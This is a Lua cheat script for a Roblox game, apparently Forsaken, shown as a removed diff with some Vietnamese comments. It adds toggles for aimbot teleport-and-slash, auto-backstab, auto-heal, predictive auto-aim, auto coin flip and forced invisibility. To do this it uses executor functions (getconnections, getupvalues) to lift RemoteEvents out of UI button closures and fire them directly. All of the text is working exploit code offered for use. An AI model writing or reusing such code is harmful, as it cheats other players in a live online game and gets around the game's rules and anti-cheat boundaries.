-
-            if spam then useSlash() end
-        end)
-    end
-
-    -- ⚔️ AI Aimbot Mode (auto tìm trong Killers folder)
-    RunService.Heartbeat:Connect(function()
-        if not enabled or cooldown or mode ~= "AI Aimbot" then return end
-        local char = lp.Character
-        if not (char and char:FindFirstChild("HumanoidRootPart")) then return end
-        local hrp = char.HumanoidRootPart
-
-        for _, killer in ipairs(killersFolder:GetChildren()) do
-            if killer:FindFirstChild("HumanoidRootPart") then
-                local kHRP = killer.HumanoidRootPart
-                local dist = (hrp.Position - kHRP.Position).Magnitude
-                if dist <= maxDistance and killer ~= lastTarget then
-                    teleportAndSlash(killer, true)
-                    break
-                end
-            end
-        end
-    end)
-
-    -- 👁️ Player Aimbot Mode
-    local function attachAnimMonitor(character)
-        local humanoid = character:WaitForChild("Humanoid", 5)
-        if not humanoid then return end
-
-        humanoid.AnimationPlayed:Connect(function(animTrack)
-            if not enabled or mode ~= "Player Aimbot" or cooldown then return end
-            local animId = animTrack.Animation and animTrack.Animation.AnimationId
-            if animId and table.find(monitoredAnimations, animId) then
-                for _, killer in ipairs(killersFolder:GetChildren()) do
-                    if killer:FindFirstChild("HumanoidRootPart") then
-                        local hrpLocal = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-                        local kHRP = killer:FindFirstChild("HumanoidRootPart")
-                        if hrpLocal and kHRP then
-                            local dist = (kHRP.Position - hrpLocal.Position).Magnitude
-                            if dist <= maxDistance * 5 then
-                                teleportAndSlash(killer, false)
-                                break
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-    end
-
-    if lp.Character then
-        attachAnimMonitor(lp.Character)
-    end
-    lp.CharacterAdded:Connect(attachAnimMonitor)
-end
-
-
-
-do
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-    local lp = Players.LocalPlayer
-
-    -- Vars
-    local healEnabled = false
-    local healHPThreshold = 50
-    local healDistance = 50
-
-    -- Heal button + remote
-    local healButton, healRemote, healConnections = nil, nil, {}
-
-    -- tìm RemoteEvent từ button Heal
-    local function findHealRemote()
-        if healRemote then return healRemote end
-        if not healButton then return nil end
-        for _, conn in ipairs(getconnections(healButton.MouseButton1Click)) do
-            local f = conn.Function
-            if f and islclosure(f) then
-                local upvals = getupvalues(f)
-                for _, v in pairs(upvals) do
-                    if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
-                        healRemote = v
-                        return healRemote
-                    end
-                end
-            end
-        end
-        return nil
-    end
-
-    local function initHealButton()
-        local gui = lp:FindFirstChild("PlayerGui")
-        if not gui then return end
-        local mainUI = gui:FindFirstChild("MainUI")
-        local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
-        healButton = container and container:FindFirstChild("FriedChicken")
-        if healButton and healButton:IsA("ImageButton") then
-            healConnections = getconnections(healButton.MouseButton1Click)
-            findHealRemote()
-        end
-    end
-
-    initHealButton()
-    lp.CharacterAdded:Connect(function()
-        task.wait(0.5)
-        initHealButton()
-    end)
-
-    local function useHeal()
-        if healRemote then
-            pcall(function()
-                healRemote:FireServer(true)
-                task.delay(0.05, function()
-                    healRemote:FireServer(false)
-                end)
-            end)
-        elseif healButton then
-            for _, conn in ipairs(healConnections) do
-                pcall(function() conn:Fire() end)
-            end
-            pcall(function() healButton:Activate() end)
-        end
-    end
-
-    -- UI ------------------------------------------------
-    local HealToggle = Tabs.Main:AddToggle("HealToggle", {
-        Title = "Auto Heal",
-        Default = false
-    })
-    HealToggle:OnChanged(function(v) healEnabled = v end)
-
-    local HealHPSlider = Tabs.Main:AddSlider("HealHPSlider", {
-        Title = "Heal HP",
-        Min = 1, Max = 100, Default = 50,
-        Rounding = 0, ValueName = "HP"
-    })
-    HealHPSlider:OnChanged(function(v) healHPThreshold = v end)
-
-    local HealDistanceSlider = Tabs.Main:AddSlider("HealDistanceSlider", {
-        Title = "Distance",
-        Min = 1, Max = 150, Default = 50,
-        Rounding = 0, ValueName = "studs"
-    })
-    HealDistanceSlider:OnChanged(function(v) healDistance = v end)
-
-    -- Helpers -------------------------------------------------------------
-    local function getPlayersFolders()
-        local pf = workspace:FindFirstChild("Players")
-        if not pf then return nil, nil, nil end
-        return pf, pf:FindFirstChild("Killers"), pf:FindFirstChild("Survivors")
-    end
-
-    local function belongsToMe(m)
-        if not (m and m:IsA("Model")) then return false end
-        if m:GetAttribute("Username") == lp.Name then return true end
-        local UsernameSV = m:FindFirstChild("Username")
-        if UsernameSV and typeof(UsernameSV.Value) == "string" and UsernameSV.Value == lp.Name then return true end
-        local Owner = m:FindFirstChild("Owner") or m:FindFirstChild("Player")
-        if Owner and Owner.Value == lp then return true end
-        local uidAttr = m:GetAttribute("UserId")
-        if uidAttr and tonumber(uidAttr) == lp.UserId then return true end
-        if m.Name == lp.Name then return true end
-        return false
-    end
-
-    local function getMyShedletsky()
-        local pf, killersFolder, survivorsFolder = getPlayersFolders()
-        local candidates = {}
-
-        local function scan(container)
-            if not container then return end
-            for _, d in ipairs(container:GetDescendants()) do
-                if d:IsA("Model") and d.Name == "Shedletsky" and d:FindFirstChild("Humanoid") and d:FindFirstChild("HumanoidRootPart") then
-                    if belongsToMe(d) then table.insert(candidates, d) end
-                end
-            end
-        end
-
-        scan(killersFolder)
-        scan(survivorsFolder)
-        scan(workspace)
-
-        if #candidates == 0 then return nil, nil, nil end
-
-        local basePos
-        if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
-            basePos = lp.Character.HumanoidRootPart.Position
-        end
-
-        local best, bestDist = candidates[1], math.huge
-        if basePos then
-            for _, m in ipairs(candidates) do
-                local hrp = m:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    local d = (hrp.Position - basePos).Magnitude
-                    if d < bestDist then best, bestDist = m, d end
-                end
-            end
-        end
-
-        local hum = best:FindFirstChildOfClass("Humanoid")
-        local hrp = best:FindFirstChild("HumanoidRootPart")
-        return best, hum, hrp
-    end
-
-    local function getNearestKillerDist(fromHRP, myModel)
-        local _, killersFolder = getPlayersFolders()
-        if not (killersFolder and fromHRP) then return math.huge end
-        local nearest = math.huge
-        for _, k in ipairs(killersFolder:GetChildren()) do
-            if k ~= myModel then
-                local khrp = k:FindFirstChild("HumanoidRootPart")
-                if khrp then
-                    local d = (fromHRP.Position - khrp.Position).Magnitude
-                    if d < nearest then nearest = d end
-                end
-            end
-        end
-        return nearest
-    end
-
-    -- Main loop ----------------------------------------------------------
-    RunService.Heartbeat:Connect(function()
-        if not healEnabled then return end
-
-        local myModel, myHumanoid, myHRP = getMyShedletsky()
-        if not (myModel and myHumanoid and myHRP) then return end
-        if myHumanoid.Health <= 0 then return end
-
-        local nearestDist = getNearestKillerDist(myHRP, myModel)
-
-        if myHumanoid.Health <= healHPThreshold and nearestDist >= healDistance then
-            useHeal()
-        end
-    end)
-end
-
-
-
-    Tabs.Main:AddSection("Chance")
-
-
-
-do
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local Stats = game:GetService("Stats")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-local LocalPlayer = Players.LocalPlayer
-
-local active = false
-local useOffset = true
-local predictionMode = "Speed"
-local aimMode = "Normal"
-local aimDuration = 1.7
-local fasterDuration = 1.5
-local spinDuration = 0.5
-local aimTargets = {"Slasher", "c00lkidd", "JohnDoe", "1x1x1x1", "Noli", "Guest 666", "Sixer"}
-
-local Humanoid, HRP = nil, nil
-local originalWS, originalJP, originalAutoRotate = nil, nil, nil
-local aiming = false
-local prevFlintVisibleAim = false
-local lastTriggerTime = 0
-
-local autoCoinflip = false
-local coinflipTargetCharge = 3
-local coinflipCooldown = 0.15
-local lastCoinflipTime = 0
-
-local blockCoinflipWhenClose = true
-local coinflipBlockDist = 50
-
-local RemoteEvent
-pcall(function()
-    RemoteEvent = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent")
-end)
-
--- ================= GUI =================
-Tabs.Main:AddDropdown("AimMode", {
-    Title = "Aim Mode",
-    Values = {"Normal", "Faster", "Reflex"},
-    Default = "Normal",
-    Callback = function(val) aimMode = val end
-})
-
-Tabs.Main:AddDropdown("PredictionMode", {
-    Title = "Prediction Mode",
-    Values = {"Speed", "Ping", "front", "No Lag"},
-    Default = "Speed",
-    Callback = function(val) predictionMode = val end
-})
-
-Tabs.Main:AddDropdown("CoinflipChargeDropdown", {
-    Title = "Select Score",
-    Values = {"1 Point", "2 Point", "3 Point"},
-    Default = "3 Point",
-}):OnChanged(function(val)
-    local num = tonumber(val and val:match("%d+"))
-    if num then coinflipTargetCharge = num end
-end)
-
-Tabs.Main:AddInput("CoinflipDistance", {
-    Title = "Distance",
-    Default = "50",
-    Placeholder = "Enter studs",
-    Callback = function(val)
-        local num = tonumber(val)
-        if num and num > 0 then
-            coinflipBlockDist = num
-        end
-    end
-})
-
-Tabs.Main:AddToggle("BlockCoinflipToggle", {
-    Title = "Safe Mode",
-    Default = true,
-}):OnChanged(function(state)
-    blockCoinflipWhenClose = state
-end)
-
-Tabs.Main:AddToggle("OffsetToggle", {
-    Title = "Enable Offset",
-    Default = true,
-    Callback = function(state) useOffset = state end
-})
-
-Tabs.Main:AddToggle("AimbotToggle", {
-    Title = "Auto Aim Shoot",
-    Default = false,
-    Callback = function(state) active = state end
-})
-
-Tabs.Main:AddToggle("AutoCoinflipToggle", {
-    Title = "Auto Coin Flip",
-    Default = false,
-}):OnChanged(function(state)
-    autoCoinflip = state
-end)
-
--- ================= Character Setup =================
-local function setupCharacter(char)
-    Humanoid = char:WaitForChild("Humanoid")
-    HRP = char:WaitForChild("HumanoidRootPart")
-end
-if LocalPlayer.Character then setupCharacter(LocalPlayer.Character) end
-LocalPlayer.CharacterAdded:Connect(setupCharacter)
-
--- ================= Helpers =================
-local function getValidTarget()
-    -- Quét tất cả Players
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer and plr.Character then
-            local char = plr.Character
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                for _, targetName in ipairs(aimTargets) do
-                    if char.Name:lower():find(targetName:lower()) then
-                        return hrp
-                    end
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function getPingSeconds()
-    local pingStat = Stats.Network.ServerStatsItem["Data Ping"]
-    if pingStat then return pingStat:GetValue() / 1000 end
-    return 0.1
-end
-
-local function isFlintlockVisible()
-    if not LocalPlayer.Character then return false end
-    local flint = LocalPlayer.Character:FindFirstChild("Flintlock", true)
-    if not flint then return false end
-    if not (flint:IsA("BasePart") or flint:IsA("MeshPart") or flint:IsA("UnionOperation")) then
-        flint = flint:FindFirstChildWhichIsA("BasePart", true)
-        if not flint then return false end
-    end
-    return flint.Transparency < 1
-end
-
-local movementThreshold = 0.5
-local function getPredictedAimPosPing(targetHRP)
-    local ping = getPingSeconds()
-    local velocity = targetHRP.Velocity
-    if velocity.Magnitude <= movementThreshold then return targetHRP.Position end
-    return targetHRP.Position + (velocity * ping)
-end
-
-local function getPredictedAimPosInfrontHRPPing(targetHRP)
-    local ping = getPingSeconds()
-    local studs = ping * 60
-    if targetHRP.Velocity.Magnitude <= movementThreshold then return targetHRP.Position end
-    return targetHRP.Position + (targetHRP.CFrame.LookVector * studs)
-end
-
-local function computeAimPos(targetHRP)
-    if predictionMode == "Ping" then
-        return getPredictedAimPosPing(targetHRP)
-    elseif predictionMode == "front" then
-        return targetHRP.Position + targetHRP.CFrame.LookVector * 4
-    elseif predictionMode == "No Lag" then
-        return getPredictedAimPosInfrontHRPPing(targetHRP)
-    else
-        local velocity = targetHRP.Velocity
-        if velocity.Magnitude > 0.1 then
-            if useOffset and HRP then
-                local ok, toTarget = pcall(function() return (targetHRP.Position - HRP.Position).Unit end)
-                if not ok then return targetHRP.Position end
-                local moveDir = velocity.Unit
-                local dot = toTarget:Dot(moveDir)
-                if math.abs(dot) < 0.85 then
-                    return targetHRP.Position + velocity * (4 / 60)
-                else
-                    return targetHRP.Position
-                end
-            else
-                return targetHRP.Position
-            end
-        else
-            return targetHRP.Position
-        end
-    end
-end
-
-local function safeSetCFrame(newCF)
-    if typeof(newCF) == "CFrame" and tostring(newCF) ~= "nan" and HRP then
-        HRP.CFrame = newCF
-    end
-end
-
-local function faceInstant(toPos)
-    if not HRP or not toPos then return end
-    local fromPos = HRP.Position
-    if (toPos - fromPos).Magnitude < 0.01 then return end
-    local lookAt = Vector3.new(toPos.X, fromPos.Y, toPos.Z)
-    local targetCF = CFrame.new(fromPos, lookAt)
-    safeSetCFrame(HRP.CFrame:Lerp(targetCF, 0.99))
-end
-
--- ================= Coinflip helpers =================
-local function getAbilityContainer()
-    local ok, container = pcall(function()
-        local gui = LocalPlayer:FindFirstChild("PlayerGui")
-        if not gui then return nil end
-        local mainUI = gui:FindFirstChild("MainUI")
-        if not mainUI then return nil end
-        return mainUI:FindFirstChild("AbilityContainer")
-    end)
-    if ok then return container end
-    return nil
-end
-
-local function tryActivateButton(button)
-    if not button then return false end
-    pcall(function() if button.Activate then button:Activate() end end)
-    local ok, conns = pcall(function()
-        if type(getconnections) == "function" and button.MouseButton1Click then
-            return getconnections(button.MouseButton1Click)
-        end
-        return nil
-    end)
-    if ok and conns then
-        for _, conn in ipairs(conns) do
-            pcall(function()
-                if conn.Function then conn.Function()
-                elseif conn.func then conn.func()
-                elseif conn.Fire then conn.Fire() end
-            end)
-        end
-    end
-    pcall(function() if button.Activated then button.Activated:Fire() end end)
-    pcall(function() if button.MouseButton1Click then button.MouseButton1Click:Fire() end end)
-    return true
-end
-
-local function findAbilityButtonByName(name)
-    local container = getAbilityContainer()
-    if not container then return nil end
-    local btn = container:FindFirstChild(name)
-    if btn then return btn end
-    local lname = name:lower()
-    for _, child in ipairs(container:GetChildren()) do
-        if child.Name and child.Name:lower():find(lname) then return child end
-        local found = child:FindFirstChildWhichIsA("ImageButton") or child:FindFirstChildWhichIsA("TextButton")
-        if found and found.Name and found.Name:lower():find(lname) then
-            return found
-        end
-    end
-    return nil
-end
-
-local function clickCoinflipButton()
-    local tryNames = {"CoinFlip", "Coin", "Reroll"}
-    for _, n in ipairs(tryNames) do
-        local b = findAbilityButtonByName(n)
-        if b then
-            if tryActivateButton(b) then return true end
-        end
-    end
-    return false
-end
-
-local function findRerollContainer()
-    local container = getAbilityContainer()
-    if not container then return nil end
-    local reroll = container:FindFirstChild("Reroll") or container:FindFirstChild("RerollAbility") or nil
-    if reroll then return reroll end
-    for _, child in ipairs(container:GetChildren()) do
-        for _, obj in ipairs(child:GetDescendants()) do
-            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and tostring(obj.Text):match("%d") then
-                return child
-            end
-        end
-    end
-    return nil
-end
-
-local function getNearbyMaxNumber()
-    local reroll = findRerollContainer()
-    if not reroll then return nil end
-    local maxNum = nil
-    for _, obj in ipairs(reroll:GetDescendants()) do
-        if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text then
-            for num in tostring(obj.Text):gmatch("%d+") do
-                local n = tonumber(num)
-                if n then
-                    if not maxNum or n > maxNum then maxNum = n end
-                end
-            end
-        end
-    end
-    return maxNum
-end
-
--- ================= Main loop =================
-RunService.RenderStepped:Connect(function()
-    -- AIMBOT LOGIC
-    if active and Humanoid and HRP then
-        local isVisible = isFlintlockVisible()
-        if isVisible and not prevFlintVisibleAim and not aiming then
-            lastTriggerTime = tick()
-            aiming = true
-        end
-        prevFlintVisibleAim = isVisible
-
-        if aiming then
-            local elapsed = tick() - lastTriggerTime
-
-            if aimMode == "Reflex" then
-                if elapsed <= spinDuration then
-                    local spinProgress = elapsed / spinDuration
-                    local spinAngle = math.rad(360 * spinProgress)
-                    safeSetCFrame(CFrame.new(HRP.Position) * CFrame.Angles(0, spinAngle, 0))
-                elseif elapsed <= spinDuration + 0.7 then
-                    if not originalWS then
-                        originalWS, originalJP, originalAutoRotate = Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate
-                    end
-                    Humanoid.AutoRotate = false
-                    HRP.AssemblyAngularVelocity = Vector3.zero
-                    local targetHRP = getValidTarget()
-                    if targetHRP then
-                        faceInstant(computeAimPos(targetHRP))
-                    end
-                else
-                    aiming = false
-                    if originalWS then
-                        Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate =
-                            originalWS, originalJP, originalAutoRotate
-                        originalWS, originalJP, originalAutoRotate = nil, nil, nil
-                    end
-                end
-            else
-                local duration = (aimMode == "Faster") and fasterDuration or aimDuration
-                if elapsed <= duration then
-                    if not originalWS then
-                        originalWS, originalJP, originalAutoRotate = Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate
-                    end
-                    Humanoid.AutoRotate = false
-                    HRP.AssemblyAngularVelocity = Vector3.zero
-                    local targetHRP = getValidTarget()
-                    if targetHRP then
-                        faceInstant(computeAimPos(targetHRP))
-                    end
-                else
-                    aiming = false
-                    if originalWS then
-                        Humanoid.WalkSpeed, Humanoid.JumpPower, Humanoid.AutoRotate =
-                            originalWS, originalJP, originalAutoRotate
-                        originalWS, originalJP, originalAutoRotate = nil, nil, nil
-                    end
-                end
-            end
-        end
-    end
-
-    -- COINFLIP LOGIC
-    if autoCoinflip then
-        local tooClose = false
-        if blockCoinflipWhenClose then
-            local targetHRP = getValidTarget()
-            if targetHRP and HRP then
-                if (targetHRP.Position - HRP.Position).Magnitude <= coinflipBlockDist then
-                    tooClose = true
-                end
-            end
-        end
-
-        if not tooClose then
-            local maxNum = getNearbyMaxNumber()
-            if not maxNum or maxNum < coinflipTargetCharge then
-                if tick() - lastCoinflipTime >= coinflipCooldown then
-                    lastCoinflipTime = tick()
-                    local ok = clickCoinflipButton()
-                    if not ok and RemoteEvent then
-                        pcall(function()
-                            RemoteEvent:FireServer("UseActorAbility", "CoinFlip")
-                        end)
-                    end
-                end
-            end
-        end
-    end
-end)
-end
-
-
-
-    Tabs.Main:AddSection("Two Time")
-
-
---// Auto Backstab Unified (AI Aimbot + Player Aimbot, tự động quét Killers Folder)
-do
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-    local lp = Players.LocalPlayer
-
-    -- ⚙️ Config
-    local Mode = "AI Aimbot"
-    local checkRadius = 18
-    local backstabDelay = 0.01
-
-    local killersFolder = workspace:WaitForChild("Players"):WaitForChild("Killers")
-
-    local ANIM_IDS = {
-        "115194624791339",
-        "86545133269813",
-        "89448354637442",
-        "77119710693654",
-        "107640065977686",
-        "112902284724598",
-    }
-
-    -- 🔘 UI
-    Tabs.Main:AddDropdown("BackstabMode", {
-        Title = "Backstab Mode",
-        Values = { "AI Aimbot", "Player Aimbot" },
-        Default = "AI Aimbot",
-    }):OnChanged(function(value)
-        Mode = value
-    end)
-
-    local enabled = false
-    Tabs.Main:AddToggle("AutoBackstab", {
-        Title = "Auto Backstab V2",
-        Default = false
-    }):OnChanged(function(state)
-        enabled = state
-    end)
-
-    Tabs.Main:AddInput("BackstabRadiusInput", {
-        Title = "Check Radius",
-        Default = tostring(checkRadius),
-        Placeholder = "Write Here (1 - 50)",
-        Numeric = true,
-        Callback = function(value)
-            local num = tonumber(value)
-            if num then
-                checkRadius = math.clamp(num, 1, 50)
-            else
-            end
-        end
-    })
-
-    -- =====================
-    -- 🗡️ Dagger Remote Finder
-    -- =====================
-    local daggerButton, daggerRemote, daggerConnections = nil, nil, {}
-
-    local function findDaggerRemote()
-        if daggerRemote then return daggerRemote end
-        if not daggerButton then return nil end
-        for _, conn in ipairs(getconnections(daggerButton.MouseButton1Click)) do
-            local f = conn.Function
-            if f and islclosure(f) then
-                for _, v in pairs(getupvalues(f)) do
-                    if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
-                        daggerRemote = v
-                        return daggerRemote
-                    end
-                end
-            end
-        end
-        return nil
-    end
-
-    local function initDaggerButton()
-        local gui = lp:FindFirstChild("PlayerGui")
-        if not gui then return end
-        local mainUI = gui:FindFirstChild("MainUI")
-        local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
-        daggerButton = container and container:FindFirstChild("Dagger")
-        if daggerButton and daggerButton:IsA("ImageButton") then
-            daggerConnections = getconnections(daggerButton.MouseButton1Click)
-            findDaggerRemote()
-        end
-    end
-
-    initDaggerButton()
-    lp.CharacterAdded:Connect(function()
-        task.wait(0.5)
-        initDaggerButton()
-    end)
-
-    local function useDagger()
-        if daggerRemote then
-            pcall(function()
-                daggerRemote:FireServer(true)
-                task.delay(0.05, function()
-                    daggerRemote:FireServer(false)
-                end)
-            end)
-        elseif daggerButton then
-            for _, conn in ipairs(daggerConnections) do
-                pcall(function() conn:Fire() end)
-            end
-            pcall(function() daggerButton:Activate() end)
-        end
-    end
-
-    -- =====================
-    -- ⚒️ Helpers
-    -- =====================
-    local function getCharacter()
-        local ch = lp.Character
-        if ch and ch.Parent then
-            local hrp = ch:FindFirstChild("HumanoidRootPart")
-            local humanoid = ch:FindFirstChildOfClass("Humanoid")
-            return ch, humanoid, hrp
-        end
-        return nil, nil, nil
-    end
-
-    local function isPlayingTargetAnimation(humanoid)
-        if not humanoid then return false end
-        for _, t in ipairs(humanoid:GetPlayingAnimationTracks()) do
-            local animId = tostring(t.Animation.AnimationId or "")
-            for _, id in ipairs(ANIM_IDS) do
-                if animId:find(id, 1, true) then
-                    return true
-                end
-            end
-        end
-        return false
-    end
-
-    local function teleportBehind(targetHRP, myHRP)
-        local look = targetHRP.CFrame.LookVector
-        local destPos = targetHRP.Position - look * 2
-        myHRP.CFrame = CFrame.new(destPos, destPos + look)
-    end
-
-    local function isBehindTarget(targetHRP, myHRP)
-        local look = targetHRP.CFrame.LookVector
-        local dir = (myHRP.Position - targetHRP.Position).Unit
-        return look:Dot(dir) < -0.5
-    end
-
-    local function getNearbyKillers(position)
-        local killers = {}
-        for _, plr in ipairs(Players:GetPlayers()) do
-            if plr ~= lp and plr.Character then
-                local char = plr.Character
-                local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
-                if hrp then
-                    local dist = (hrp.Position - position).Magnitude
-                    if dist <= checkRadius then
-                        table.insert(killers, {model = char, hrp = hrp, dist = dist})
-                    end
-                end
-            end
-        end
-        return killers
-    end
-
-    local function getNearbyAIKillers(hrp)
-        local killers = {}
-        for _, killer in ipairs(killersFolder:GetChildren()) do
-            local kHRP = killer:FindFirstChild("HumanoidRootPart")
-            if kHRP then
-                local dist = (kHRP.Position - hrp.Position).Magnitude
-                if dist <= checkRadius then
-                    table.insert(killers, {model = killer, hrp = kHRP, dist = dist})
-                end
-            end
-        end
-        return killers
-    end
-
-    -- =====================
-    -- 🔄 Main Loop
-    -- =====================
-    local cooldown = false
-    local lastTarget = nil
-
-    RunService.Heartbeat:Connect(function()
-        if not enabled or cooldown then return end
-        local char, humanoid, myHRP = getCharacter()
-        if not (char and humanoid and myHRP) then return end
-
-        -- 🚨 Chỉ hoạt động nếu model là "TwoTime"
-        if char.Name ~= "TwoTime" then return end
-
-        if Mode == "Player Aimbot" then
-            if isPlayingTargetAnimation(humanoid) then
-                local killers = getNearbyKillers(myHRP.Position)
-                if #killers > 0 then
-                    table.sort(killers, function(a,b) return a.dist < b.dist end)
-                    local target = killers[1]
-                    cooldown = true
-
-                    local start = tick()
-                    local conn
-                    conn = RunService.Heartbeat:Connect(function()
-                        if not (char and target.hrp and char.Parent and target.hrp.Parent) then
-                            if conn then conn:Disconnect() end
-                            cooldown = false
-                            return
-                        end
-                        if tick() - start >= 0.7 then
-                            if conn then conn:Disconnect() end
-                            task.delay(1, function() cooldown = false end)
-                            return
-                        end
-                        teleportBehind(target.hrp, myHRP)
-                        useDagger()
-                    end)
-                end
-            end
-
-        elseif Mode == "AI Aimbot" then
-            local killers = getNearbyAIKillers(myHRP)
-            if #killers > 0 then
-                table.sort(killers, function(a,b) return a.dist < b.dist end)
-                local target = killers[1]
-                if target.model ~= lastTarget and isBehindTarget(target.hrp, myHRP) then
-                    cooldown = true
-                    lastTarget = target.model
-
-                    local start = tick()
-                    local conn
-                    conn = RunService.Heartbeat:Connect(function()
-                        if not (char and char.Parent and target.hrp and target.hrp.Parent) then
-                            if conn then conn:Disconnect() end
-                            return
-                        end
-                        if tick() - start >= 0.7 then
-                            if conn then conn:Disconnect() end
-                            task.delay(10, function()
-                                cooldown = false
-                                lastTarget = nil
-                            end)
-                            return
-                        end
-                        teleportBehind(target.hrp, myHRP)
-                        useDagger()
-                    end)
-                end
-            end
-        end
-    end)
-
-    lp.CharacterAdded:Connect(function()
-        task.wait(1)
-    end)
-end
-
-
-
-    Tabs.Main:AddSection("007n7")
-
-
-do
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    local running = false
-    local animTrack
-    local InvisibleEnabled = false
-
-    -- 🔍 Tự động lấy Survivors trong workspace
-    local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
-
-    local function getHumanoid()
-        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        return char:FindFirstChildOfClass("Humanoid"), char
-    end
-
-    local function getAnimator(humanoid)
-        local animator = humanoid:FindFirstChildOfClass("Animator")
-        if not animator then
-            animator = Instance.new("Animator")
-            animator.Parent = humanoid
-        end
-        return animator
-    end
-
-    local function playInvisibleAnim(humanoid)
-        local animator = getAnimator(humanoid)
-        if not animTrack or not animTrack.IsPlaying then
-            local animation = Instance.new("Animation")
-            animation.AnimationId = "rbxassetid://75804462760596"
-            animTrack = animator:LoadAnimation(animation)
-            animTrack.Looped = true
-            animTrack:Play()
-            animTrack:AdjustSpeed(0)
-        end
-    end
-
-    local function stopInvisibleAnim()
-        if animTrack and animTrack.IsPlaying then
-            animTrack:Stop()
-            animTrack = nil
-        end
-    end
-
-    -- ✅ Kiểm tra nếu character là survivor (trong folder Survivors)
-    local function isSurvivorModel(char)
-        if not char then return false end
-        if survivorsFolder:FindFirstChild(char.Name) then
-            return true
-        end
-        return false
-    end
-
-    local function handleToggle(enabled)
-        InvisibleEnabled = enabled
-        local humanoid, char = getHumanoid()
-        if not humanoid or not char then return end
-
-        if enabled then
-            running = true
-            task.spawn(function()
-                while running and InvisibleEnabled do
-                    humanoid, char = getHumanoid()
-                    if not humanoid or not char then
-                        task.wait(0.5)
-                        continue
-                    end
-
-                    if isSurvivorModel(char) then
-                        playInvisibleAnim(humanoid)
-                    else
-                        stopInvisibleAnim()
-                    end
-                    task.wait(0.5)
-                end
-            end)
-        else
-            running = false
-            stopInvisibleAnim()
-        end
-    end
-
-    LocalPlayer.CharacterAdded:Connect(function(char)
-        task.wait(1)
-        if InvisibleEnabled and isSurvivorModel(char) then
-            handleToggle(true)
-        end
-    end)
-
-    -- 🟢 Fluent UI Toggle
-    Tabs.Main:AddToggle("InstantInvisibleV2", {
-        Title = "Instant Invisible",
-        Default = false
-    }):OnChanged(function(Value)
-        handleToggle(Value)
-    end)
-end
-
-
-
-do
-    -- Invisible upon Cloning (sandboxed)
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    local running = false
-    local animTrack
-
-    local function getHumanoid()
-        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        return char:FindFirstChildOfClass("Humanoid"), char
-    end
-
-    local function getAnimator(humanoid)
-        local animator = humanoid:FindFirstChildOfClass("Animator")
-        if not animator then
-            animator = Instance.new("Animator")
-            animator.Parent = humanoid
-        end
-        return animator
-    end
-
-    local function playInvisibleAnim(humanoid)
-        local animator = getAnimator(humanoid)
-        if not animTrack or not animTrack.IsPlaying then
-            local animation = Instance.new("Animation")
-            animation.AnimationId = "rbxassetid://75804462760596"
-            animTrack = animator:LoadAnimation(animation)
-            animTrack.Looped = true
-            animTrack:Play()
-            animTrack:AdjustSpeed(0)
-        end
-    end
-
-    local function stopInvisibleAnim()
-        if animTrack and animTrack.IsPlaying then
-            animTrack:Stop()
-            animTrack = nil
-        end
-    end
-
-    local function handleToggle(enabled)
-        local humanoid, char = getHumanoid()
-        if not humanoid or not char then return end
-
-        if enabled then
-            running = true
-            task.spawn(function()
-                while running do
-                    humanoid, char = getHumanoid()
-                    if not humanoid or not char then break end
-
-                    local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
-                    local root = char:FindFirstChild("HumanoidRootPart")
-
-                    if torso and torso.Transparency ~= 0 then
-                        playInvisibleAnim(humanoid)
-                        if root then root.Transparency = 0.4 end
-                    else
-                        stopInvisibleAnim()
-                        if root then root.Transparency = 1 end
-                    end
-
-                    task.wait(0.5)
-                end
-            end)
-        else
-            running = false
-            stopInvisibleAnim()
-            if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.Transparency = 1
-            end
-        end
-    end
-
-    -- ✅ Toggle dạng mới Fluent UI
-    Tabs.Main:AddToggle("InvisibleCloneV2", {
-        Title = "Invisible if cloned",
-        Default = _G.InvisibleClone or false
-    }):OnChanged(function(Value)
-        _G.InvisibleClone = Value
-        handleToggle(Value)
-    end)
-end
-
-
-    Tabs.Main:AddSection("Veeronica")
-
-Tabs.Main:AddToggle("AutoTrick", {
-    Title = "Auto Trick V2",
-    Default = false,
-    Callback = function(Value)
-        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        local Players = game:GetService("Players")
-        local VirtualInputManager = game:GetService("VirtualInputManager")
-
-        local player = Players.LocalPlayer
-        local device = "Mobile"
-
-        -- 🧩 Safe get UI & Behavior folder (cache sẵn)
-        local function getBehaviorFolder()
-            local ok, folder = pcall(function()
-                return ReplicatedStorage.Assets.Survivors.Veeronica.Behavior
-            end)
-            return ok and folder
-        end
-
-        local function getSprintingButton()
-            local gui = player:FindFirstChild("PlayerGui")
-            if not gui then return end
-            local main = gui:FindFirstChild("MainUI")
-            if not main then return end
-            return main:FindFirstChild("SprintingButton")
-        end
